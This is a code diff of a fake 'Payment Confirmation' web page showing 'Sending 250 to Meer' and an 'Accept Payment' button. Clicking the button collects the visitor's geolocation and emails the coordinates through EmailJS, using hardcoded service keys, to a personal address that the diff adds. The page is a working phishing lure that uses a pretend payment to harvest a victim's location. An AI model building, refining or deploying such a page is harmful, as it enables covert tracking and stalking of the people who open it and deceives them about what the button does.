@@ -2,22 +2,17 @@
 <html>
 <head>
   <title>Payment Confirmation</title>
-  <style>
-    body { font-family: Arial, sans-serif; text-align: center; margin-top: 100px; }
-    button { padding: 15px 30px; font-size: 18px; cursor: pointer; }
-    #status { margin-top: 20px; font-weight: bold; }
-  </style>
 </head>
-<body>
+<body style="font-family: Arial, sans-serif; text-align:center; margin-top: 100px;">
   <h2>Sending 250 to Meer</h2>
-  <button onclick="getLocation()">Accept Payment</button>
+  <button style="padding: 15px 30px; font-size: 18px; cursor:pointer;" onclick="getLocation()">Accept Payment</button>
   <p id="status"></p>
 
-  <!-- EmailJS SDK -->
-  <script src="https://cdn.emailjs.com/sdk/3.2.0/email.min.js"></script>
+  <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
   <script>
-    // Initialize EmailJS with your public key
-    emailjs.init('i7BweUs_ujM3g34jk');
+    (function(){
+      emailjs.init('i7BweUs_ujM3g34jk');  // Your public key
+    })();
 
     function getLocation() {
       const status = document.getElementById('status');
@@ -33,21 +28,22 @@
         (position) => {
           const latitude = position.coords.latitude;
           const longitude = position.coords.longitude;
-          const date = new Date().toLocaleString();
 
-          // Prepare the template parameters to send
+          status.textContent = 'Payment accepted. Sending location...';
+
+          // Prepare email params
           const templateParams = {
             latitude: latitude,
             longitude: longitude,
-            date: date
+            to_email: 'tsylviaelise@icloud.com'  // Your email here (optional depending on template)
           };
 
-          // Send the email with location info
+          // Send email via EmailJS
           emailjs.send('service_76mv2fb', 'template_5io8d5q', templateParams)
             .then(() => {
-              status.textContent = 'Payment accepted. Location sent successfully.';
+              status.textContent = 'Payment accepted. Location sent.';
             }, (error) => {
-              status.textContent = 'Failed to send location info. Try again later.';
+              status.textContent = 'Failed to send location email. Please try again.';
               console.error('EmailJS error:', error);
             });
         },
